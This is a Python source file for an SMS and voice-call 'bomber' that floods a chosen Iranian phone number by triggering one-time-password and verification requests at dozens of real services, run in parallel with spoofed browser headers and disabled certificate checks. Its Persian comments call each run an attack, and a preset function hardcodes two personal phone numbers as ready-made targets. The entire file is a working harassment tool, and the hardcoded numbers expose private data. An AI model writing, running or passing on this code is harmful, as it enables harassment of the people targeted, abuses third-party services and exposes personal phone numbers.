import requests
import threading
import time
import random
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class UltimateBomberVIP:
    def __init__(self):
        self.success_count = 0
        self.failed_count = 0
        self.lock = threading.Lock()
        self.is_running = True
        self.working_services = []
        self.total_requests = 0
        self.completed_requests = 0
        self.start_time = None
        
    def setup_session(self):
        """تنظیم session با سرعت بالا"""
        session = requests.Session()
        
        retry_strategy = Retry(
            total=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["POST", "GET"],
            backoff_factor=0.3
        )
        
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=200,
            pool_maxsize=400
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        return session

    def format_phone(self, phone):
        """فرمت‌های مختلف شماره"""
        clean_phone = ''.join(filter(str.isdigit, phone))
        formats = []
        
        if clean_phone.startswith('0'):
            formats.extend([
                clean_phone,
                clean_phone[1:],
                f"+98{clean_phone[1:]}",
                f"98{clean_phone[1:]}",
            ])
        else:
            formats.extend([
                f"0{clean_phone}",
                clean_phone,
                f"+98{clean_phone}",
                f"98{clean_phone}",
            ])
        
        return list(set(formats))

    def send_request_vip(self, service):
        """ارسال درخواست با سرعت VIP"""
        if not self.is_running:
            return

        url, data, headers, method, phone_formats, service_name, service_type = service
        
        try:
            phone_format = random.choice(phone_formats)
            formatted_data = self.format_data(data, phone_format)
            
            session = self.setup_session()
            
            time.sleep(random.uniform(0.05, 0.15))
            
            if method.upper() == "POST":
                response = session.post(url, json=formatted_data, headers=headers, timeout=8, verify=False)
            elif method.upper() == "GET":
                response = session.get(url, params=formatted_data, headers=headers, timeout=8, verify=False)
            else:
                response = session.request(method, url, json=formatted_data, headers=headers, timeout=8, verify=False)

            with self.lock:
                self.completed_requests += 1
                
                if response.status_code in [200, 201, 202, 204]:
                    self.success_count += 1
                    if service_name not in [s[0] for s in self.working_services]:
                        self.working_services.append((service_name, service_type))
                else:
                    self.failed_count += 1

        except Exception:
            with self.lock:
                self.failed_count += 1
                self.completed_requests += 1

    def format_data(self, data, phone):
        """فرمت‌دهی داده‌ها"""
        if isinstance(data, dict):
            formatted_data = {}
            for key, value in data.items():
                if value == "phone":
                    formatted_data[key] = phone
                elif isinstance(value, dict):
                    formatted_data[key] = self.format_data(value, phone)
                elif isinstance(value, list):
                    formatted_data[key] = [self.format_data(item, phone) if isinstance(item, dict) else item for item in value]
                else:
                    formatted_data[key] = value
            return formatted_data
        return data

    def get_common_headers(self):
        """هدرهای مشترک"""
        return {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
        }

    def get_sms_bomber_vip_services(self, phone_formats):
        """سرویس‌های SMS Bomber VIP"""
        headers = self.get_common_headers()
        services = []

        vip_sms_services = [
            # سرویس‌های اصلی
            ("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", 
             {"cellphone": "phone"}, headers, "POST", "Snapp Taxi", "SMS"),
            
            ("https://api.divar.ir/v5/auth/authenticate", 
             {"phone": "phone"}, headers, "POST", "Divar", "SMS"),

            ("https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass", 
             {"cellphone": "phone"}, headers, "POST", "Snappfood", "SMS"),

            ("https://api.digikala.com/v1/user/authenticate/", 
             {"username": "phone"}, headers, "POST", "Digikala", "SMS"),
            
            ("https://api.timcheh.com/auth/otp/send", 
             {"mobile": "phone"}, headers, "POST", "Timcheh", "SMS"),

            ("https://api.jabama.com/api/v1/auth/otp",
             {"mobile": "phone"}, headers, "POST", "Jabama", "SMS"),

            ("https://api.alopeyk.com/api/v1/otp/send", 
             {"phone": "phone"}, headers, "POST", "Alopeyk", "SMS"),
            
            ("https://api.tapsi.ir/api/v2/user", 
             {"credential": {"phoneNumber": "phone", "role": "PASSENGER"}}, headers, "POST", "Tapsi", "SMS"),

            ("https://api.torob.com/a/phone/send-pin/", 
             {"phone_number": "phone"}, headers, "POST", "Torob", "SMS"),

            ("https://api.sheypoor.com/auth", 
             {"username": "phone"}, headers, "POST", "Sheypoor", "SMS"),
            
            ("https://api.reyhoon.com/api/v2/auth/otp", 
             {"phone": "phone"}, headers, "POST", "Reyhoon", "SMS"),
            
            ("https://api.basalam.com/user", 
             {"mobile": "phone"}, headers, "POST", "Basalam", "SMS"),
            
            ("https://api.zoodfood.com/api/v3/auth/otp", 
             {"cellphone": "phone"}, headers, "POST", "Zoodfood", "SMS"),

            # سرویس‌های جدید اضافه شده
            ("https://api.namava.ir/api/v1.0/accounts/registrations/by-phone/send", 
             {"phoneNumber": "phone"}, headers, "POST", "Namava", "SMS"),
            
            ("https://api.fidibo.com/api/register/send_code", 
             {"phone": "phone"}, headers, "POST", "Fidibo", "SMS"),
            
            ("https://api.bitpin.ir/api/v1/usr/register/phone/code/send/", 
             {"phone": "phone"}, headers, "POST", "Bitpin", "SMS"),
            
            ("https://api.eminij.ir/api/v1/auth/send-otp", 
             {"mobile": "phone"}, headers, "POST", "Eminij", "SMS"),
            
            ("https://api.banimode.com/banimode/shop/api/v2/auth/login", 
             {"phone_number": "phone"}, headers, "POST", "Banimode", "SMS"),
            
            ("https://api.mrbilit.com/api/v3/register/step1", 
             {"mobile": "phone"}, headers, "POST", "MrBilit", "SMS"),
            
            ("https://api.digistyle.com/api/UserAccount/SendCode", 
             {"phoneNumber": "phone"}, headers, "POST", "Digistyle", "SMS"),
            
            ("https://api.chamran.ir/api/v1/auth/send-otp", 
             {"phone": "phone"}, headers, "POST", "Chamran", "SMS"),
            
            ("https://api.ponisha.ir/api/auth/signup/step1", 
             {"phone": "phone"}, headers, "POST", "Ponisha", "SMS"),
            
            ("https://api.quera.ir/api/accounts/send_otp/", 
             {"phone_number": "phone"}, headers, "POST", "Quera", "SMS"),
            
            ("https://api.zoomg.ir/api/v1/auth/send-otp", 
             {"phone": "phone"}, headers, "POST", "Zoomg", "SMS"),
            
            ("https://api.taaghche.com/api/v1/signin/mobile", 
             {"mobile": "phone"}, headers, "POST", "Taaghche", "SMS"),
            
            ("https://api.irancell.ir/fa/api/v1/otp/send", 
             {"msisdn": "phone"}, headers, "POST", "Irancell", "SMS"),
            
            ("https://api.rightel.ir/fa/api/v1/otp/send", 
             {"mobile": "phone"}, headers, "POST", "Rightel", "SMS"),
            
            ("https://api.shatel.ir/api/v1/auth/send-otp", 
             {"phone_number": "phone"}, headers, "POST", "Shatel", "SMS"),
            
            ("https://api.mci.ir/api/v1/verification/send", 
             {"mobile": "phone"}, headers, "POST", "MCI", "SMS"),
            
            ("https://api.taliya.ir/api/v1/auth/send-code", 
             {"phone": "phone"}, headers, "POST", "Taliya", "SMS"),
            
            ("https://api.cafebazaar.ir/rest-v1/process/OTPRequest", 
             {"phoneNumber": "phone"}, headers, "POST", "CafeBazaar", "SMS"),
            
            ("https://api.myket.ir/api/v1/auth/send-otp", 
             {"phone": "phone"}, headers, "POST", "Myket", "SMS"),
            
            ("https://api.parsijoo.ir/api/v1/otp/send", 
             {"mobile": "phone"}, headers, "POST", "Parsijoo", "SMS"),
            
            ("https://api.javid.ir/api/v1/auth/register", 
             {"phone": "phone"}, headers, "POST", "Javid", "SMS"),
            
            ("https://api.digiarz.com/api/otp/send", 
             {"mobile": "phone"}, headers, "POST", "Digiarz", "SMS"),
            
            ("https://api.raygansms.com/fa/api/v1/otp/send", 
             {"phone_number": "phone"}, headers, "POST", "RayganSMS", "SMS"),
            
            ("https://api.sibapp.com/api/otp-requests", 
             {"phone": "phone"}, headers, "POST", "SibApp", "SMS"),
            
            ("https://api.iranapps.ir/api/v1/users/send-activation-code", 
             {"mobile": "phone"}, headers, "POST", "IranApps", "SMS"),
        ]

        for service in vip_sms_services:
            url, data, headers, method, name, service_type = service
            services.append((url, data, headers, method, phone_formats, name, service_type))
        
        return services

    def get_call_bomber_vip_services(self, phone_formats):
        """سرویس‌های Call Bomber VIP"""
        headers = self.get_common_headers()
        services = []

        vip_call_services = [
            # سرویس‌های اصلی
            ("https://api.callservice.ir/api/v1/voice/send", 
             {"phone_number": "phone", "method": "voice"}, headers, "POST", "Call Service", "CALL"),
            
            ("https://voice.verificationapi.com/v2/call", 
             {"mobile": "phone", "type": "voice_call"}, headers, "POST", "Verification API", "CALL"),
            
            ("https://api.voiceotp.com/v1/request", 
             {"phone_number": "phone", "channel": "voice"}, headers, "POST", "Voice OTP", "CALL"),
            
            ("https://call.authenticate.com/api/v1/voice", 
             {"phone": "phone", "method": "call"}, headers, "POST", "Authenticate Call", "CALL"),

            ("https://api.telegram-call.com/v1/voice", 
             {"phone": "phone", "message": "Test call"}, headers, "POST", "Telegram Call", "CALL"),
            
            ("https://api.irancall.com/v1/voice/send", 
             {"mobile": "phone"}, headers, "POST", "Iran Call", "CALL"),
            
            ("https://call.shatel.ir/api/v1/voice", 
             {"phone": "phone"}, headers, "POST", "Shatel Call", "CALL"),

            # سرویس‌های جدید اضافه شده
            ("https://api.voicecall.ir/api/v2/call/send", 
             {"phone": "phone", "type": "voice"}, headers, "POST", "VoiceCall IR", "CALL"),
            
            ("https://callapi.novin.ir/v1/voice/send", 
             {"mobile": "phone"}, headers, "POST", "Novin Call", "CALL"),
            
            ("https://api.persiancall.com/api/v1/voice", 
             {"phone_number": "phone"}, headers, "POST", "Persian Call", "CALL"),
            
            ("https://call.melipayamak.com/api/v1/send/voice", 
             {"to": "phone"}, headers, "POST", "MeliPayamak Call", "CALL"),
            
            ("https://api.aryacall.com/v1/voice/send", 
             {"phone": "phone"}, headers, "POST", "Arya Call", "CALL"),
            
            ("https://call.rayabank.net/api/v1/voice", 
             {"mobile": "phone"}, headers, "POST", "Raya Call", "CALL"),
            
            ("https://api.samantalks.com/v1/call/send", 
             {"phone": "phone"}, headers, "POST", "Saman Talks", "CALL"),
            
            ("https://call.parsian.com/api/v1/voice", 
             {"phone_number": "phone"}, headers, "POST", "Parsian Call", "CALL"),
            
            ("https://api.irancallcenter.com/v1/voice/send", 
             {"mobile": "phone"}, headers, "POST", "Iran Call Center", "CALL"),
            
            ("https://call.karafarin.com/api/v1/voice", 
             {"phone": "phone"}, headers, "POST", "Karafarin Call", "CALL"),
            
            ("https://api.tehrancall.com/v1/voice/send", 
             {"phone_number": "phone"}, headers, "POST", "Tehran Call", "CALL"),
            
            ("https://call.sarmad.com/api/v1/voice", 
             {"mobile": "phone"}, headers, "POST", "Sarmad Call", "CALL"),
            
            ("https://api.ariavoice.com/v1/call/send", 
             {"phone": "phone"}, headers, "POST", "Aria Voice", "CALL"),
            
            ("https://call.soroush.com/api/v1/voice", 
             {"phone_number": "phone"}, headers, "POST", "Soroush Call", "CALL"),
            
            ("https://api.persiavoice.com/v1/voice/send", 
             {"mobile": "phone"}, headers, "POST", "Persia Voice", "CALL"),
            
            ("https://call.gap.im/api/v1/voice", 
             {"phone": "phone"}, headers, "POST", "Gap Call", "CALL"),
            
            ("https://api.balesms.com/v1/call/send", 
             {"phone_number": "phone"}, headers, "POST", "Bale Call", "CALL"),
            
            ("https://call.rubika.ir/api/v1/voice", 
             {"mobile": "phone"}, headers, "POST", "Rubika Call", "CALL"),
            
            ("https://api.itooplus.com/v1/voice/send", 
             {"phone": "phone"}, headers, "POST", "iToo Call", "CALL"),
            
            ("https://call.iranserver.com/api/v1/voice", 
             {"phone_number": "phone"}, headers, "POST", "Iran Server Call", "CALL"),
        ]

        for service in vip_call_services:
            url, data, headers, method, name, service_type = service
            services.append((url, data, headers, method, phone_formats, name, service_type))
        
        return services

    def start_sms_bomber_vip(self, phone, requests_count=150):
        """شروع SMS Bomber VIP"""
        return self._start_attack(phone, requests_count, "sms")

    def start_call_bomber_vip(self, phone, requests_count=120):
        """شروع Call Bomber VIP"""
        return self._start_attack(phone, requests_count, "call")

    def start_super_vip(self, phone, requests_count=250):
        """شروع Super VIP"""
        return self._start_attack(phone, requests_count, "both")

    def _start_attack(self, phone, total_requests, attack_type):
        """شروع حمله اصلی"""
        try:
            self.is_running = True
            self.success_count = 0
            self.failed_count = 0
            self.completed_requests = 0
            self.working_services = []
            
            phone_formats = self.format_phone(phone)
            
            if not phone_formats:
                return {"error": "شماره تلفن معتبر نیست"}
            
            sms_services = self.get_sms_bomber_vip_services(phone_formats)
            call_services = self.get_call_bomber_vip_services(phone_formats)
            
            if attack_type == "sms":
                services = sms_services
            elif attack_type == "call":
                services = call_services
            else:
                services = sms_services + call_services
            
            if not services:
                return {"error": "هیچ سرویسی در دسترس نیست"}
            
            self.total_requests = min(total_requests, len(services) * 3)
            self.start_time = time.time()
            
            max_workers = min(80, len(services))
            
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = []
                for service in services:
                    if len(futures) >= self.total_requests:
                        break
                    futures.append(executor.submit(self.send_request_vip, service))
                
                for future in as_completed(futures):
                    if not self.is_running:
                        break
                    try:
                        future.result(timeout=10)
                    except:
                        pass
            
            duration = time.time() - self.start_time
            
            result = {
                "success": True,
                "phone": phone,
                "attack_type": attack_type,
                "duration": f"{duration:.2f} ثانیه",
                "total_requests": self.total_requests,
                "successful": self.success_count,
                "failed": self.failed_count,
                "success_rate": f"{(self.success_count/self.total_requests)*100:.1f}%" if self.total_requests > 0 else "0%",
                "speed": f"{self.total_requests/duration:.1f} درخواست/ثانیه" if duration > 0 else "0",
                "working_services": [f"{name}" for name, typ in self.working_services[:8]]
            }
            
            return result
            
        except Exception as e:
            return {"error": f"خطا در اجرا: {str(e)}"}
    
    def stop_attack(self):
        """توقف حمله"""
        self.is_running = False

    def quick_attack_preset(self, preset_name):
        """حمله سریع با شماره‌های پیش‌فرض"""
        preset_numbers = {
            "yasini": "09335037492",
            "hasani": "09122805035"
        }
        
        if preset_name in preset_numbers:
            return self.start_super_vip(preset_numbers[preset_name], 300)
        else:
            return {"error": "شماره پیش‌فرض یافت نشد"}
